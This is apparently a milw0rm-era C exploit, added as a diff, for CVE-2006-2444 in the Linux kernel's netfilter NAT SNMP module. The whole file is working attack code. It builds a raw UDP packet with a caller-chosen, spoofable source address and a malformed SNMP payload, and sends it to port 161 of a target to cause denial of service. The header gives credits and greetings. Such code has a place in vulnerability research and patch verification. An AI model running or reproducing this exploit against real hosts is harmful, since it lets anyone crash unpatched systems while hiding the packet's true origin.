@@ -1,0 +1,130 @@
+/*
+ *  ecl-nf-snmpwn.c - 30/05/06
+ *
+ *  Alex Behar <alex@ecl-labs.org>
+ *  Yuri Gushin <yuri@ecl-labs.org>
+ *  
+ *  A patch review we did on the 2.6.16.17->18 Linux kernel source tree revealed
+ * a restructuring of code in the snmp_parse_mangle() and the snmp_trap_decode()
+ * functions. After further research it turned out to be a vulnerability
+ * previously reported[1] and assigned with CVE-2006-2444. For more details,
+ * the version change log.
+ *
+ *
+ *
+ * 1) http://kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.16.18
+ *
+ * -- 
+ * Greets fly out to the ECL crew - Valentin Slavov, Dimityr Manevski. 
+ * To stranger, shrink, the Console Pimps crew (blexim, ex0, hugin, w00f, matt,
+ * kyu, kbd and the rest), our favorite soldier boy Sagi Horev, the SigMIL crew,
+ * izik, tanin00, and everyone else we left out. 
+ *
+ * P.S. - blexim, how are your FACECRABS ???? :))))
+ *
+ */
+
+
+#ifndef _BSD_SOURCE
+#define _BSD_SOURCE
+#endif
+#include <stdio.h>
+#include <string.h>
+#include <time.h>
+#include <libnet.h>
+
+void banner();
+void usage(char *);
+
+char pwnage[] = "\x30\x0a\x02\x01\x00\x04\x03\x45\x43\x4c\xa4\x00";
+
+int main(int argc, char **argv)
+{
+	char errbuf[LIBNET_ERRBUF_SIZE];
+	libnet_t *l;
+	int c;
+	u_char *buf;
+	int packet_len = 0;
+	struct ip *IP;
+	struct udphdr *UDP;
+	u_int32_t src = 0, dst = 0;
+
+
+	banner();
+
+	if (argc < 3) usage(argv[0]);
+
+	if ((l = libnet_init(LIBNET_RAW4, NULL, errbuf)) == NULL) {
+		fprintf(stderr, "[!] libnet_init() failed: %s", errbuf);
+		exit(-1);
+	}
+
+	if ((src = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE)) == -1) {
+		fprintf(stderr, "[!] Unresolved source address.\n");
+		exit(-1);
+	}
+	if ((dst = libnet_name2addr4(l, argv[2], LIBNET_RESOLVE)) == -1) {
+		fprintf(stderr, "[!] Unresolved destination address.\n");
+		exit(-1);
+	}
+
+	if ((buf = malloc(IP_MAXPACKET)) == NULL) {
+		perror("malloc");
+		exit(-1);
+	}
+
+	UDP = (struct udphdr *)(buf + LIBNET_IPV4_H);
+
+	packet_len = LIBNET_IPV4_H + LIBNET_UDP_H + sizeof(pwnage) - 1;
+
+	srand(time(NULL));
+	IP = (struct ip *) buf;
+	IP->ip_v    = 4;                   /* version 4 */
+	IP->ip_hl   = 5;		     /* header length */
+	IP->ip_tos  = 0;                   /* IP tos */
+	IP->ip_len  = htons(packet_len);   /* total length */
+	IP->ip_id   = rand();              /* IP ID */
+	IP->ip_off  = htons(0);            /* fragmentation flags */
+	IP->ip_ttl  = 64;                  /* time to live */
+	IP->ip_p    = IPPROTO_UDP;         /* transport protocol */
+	IP->ip_sum  = 0;
+	IP->ip_src.s_addr = src;
+	IP->ip_dst.s_addr = dst;
+
+	UDP->uh_sport = rand();
+	UDP->uh_dport = (argc > 3) ? htons((u_short)atoi(argv[3])) : htons(161);
+	UDP->uh_ulen = htons(LIBNET_UDP_H + sizeof(pwnage) - 1);
+	UDP->uh_sum = 0;
+
+	memcpy(buf + LIBNET_IPV4_H + LIBNET_UDP_H, pwnage, sizeof(pwnage) - 1);
+
+	libnet_do_checksum(l, (u_int8_t *)buf, IPPROTO_UDP, packet_len - LIBNET_IPV4_H);
+
+	if ((c = libnet_write_raw_ipv4(l, buf, packet_len)) == -1)
+	{
+		fprintf(stderr, "[!] Write error: %s\n", libnet_geterror(l));
+		exit(-1);
+	}
+
+	printf("[+] Packet sent.\n");
+
+	libnet_destroy(l);
+	free(buf);
+	return (0);
+}
+
+void usage(char *cmd)
+{
+	printf("[!] Usage: %s <source> <destination> [port]\n", cmd);
+	exit(-1);
+}
+
+void banner()
+{
+	printf("\t\tNetfilter NAT SNMP module DoS exploit\n"
+			"\t\t   Yuri Gushin <yuri@ecl-labs.org>\n"
+			"\t\t    Alex Behar <alex@ecl-labs.org>\n"
+			"\t\t\t       ECL Team\n\n\n");
+}
+
+// milw0rm.com [2006-06-05]
